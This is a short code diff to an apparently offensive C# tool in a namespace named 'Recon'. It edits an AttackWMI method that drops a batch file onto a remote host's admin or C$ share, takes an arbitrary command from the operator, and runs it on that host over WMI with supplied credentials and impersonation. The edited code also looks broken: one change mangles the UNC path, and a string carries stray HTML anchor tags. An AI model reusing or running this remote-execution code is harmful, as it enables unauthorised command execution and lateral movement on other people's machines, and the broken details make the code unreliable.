@@ -552,7 +552,7 @@ namespace Recon
         public static void AttackWMI(string wmiUsername, string wmiPassword, string domainURL, string hostname)
         {
             //Get commands for attack
-            string commandFile = @"\\" + hostname + "\\admin$\\process.bat";
+            string commandFile = "\\" + hostname + "\\c$\\process.bat";
 
             try
             {
@@ -565,7 +565,7 @@ namespace Recon
                 StreamWriter sw = new StreamWriter(commandFile);
 
                 //Command
-                string command = "DIR > <a>\\\\</a>" + hostname + "\\admin$\\output.txt";
+                string command = "DIR > <a>\\\\</a>" + hostname + "\\c$\\output.txt";
                 Console.WriteLine("Enter remote command, for example, Notepad.exe, Dir, Shutdown -r:");
                 //Get command from user
                 command = Console.ReadLine();
@@ -583,7 +583,7 @@ namespace Recon
 
             try
             {
-                Console.WriteLine("Attacking " + hostname + "via WMI..");
+                Console.WriteLine("Attacking " + hostname + " via WMI..");
                 ConnectionOptions options = new ConnectionOptions();
                 options.Impersonation = ImpersonationLevel.Impersonate;
                 options.Username = wmiUsername;
